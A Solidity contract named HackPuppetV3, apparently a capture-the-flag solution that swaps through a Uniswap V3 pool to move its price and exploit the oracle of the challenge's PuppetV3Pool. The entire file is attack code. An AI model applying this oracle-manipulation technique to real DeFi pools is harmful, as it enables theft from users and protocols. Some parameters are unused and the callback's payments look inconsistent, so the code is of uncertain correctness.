// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;

import "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";

import { PuppetV3Pool } from "./PuppetV3Pool.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract HackPuppetV3 is IUniswapV3SwapCallback {
    IWETH weth;
    IERC20 token;
    IUniswapV3Pool pool;
    address manager;
    uint256 fee;

    constructor(
        IWETH _weth,
        IERC20 _token,
        IUniswapV3Pool _pool,
        address _manager
    ) {
        weth = _weth;
        token = _token;
        pool = _pool;
        manager = _manager;
    }

    function swap(uint256 amount, uint256 _fee, uint256 sqrt) public {
        fee = _fee;
        pool.swap(address(this), true, 1 ether, uint160(sqrt), "");
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external override {
        weth.transfer(address(pool), uint256(amount1Delta));
        payable(address(pool)).transfer(fee);
    }

    fallback() external payable {}
}
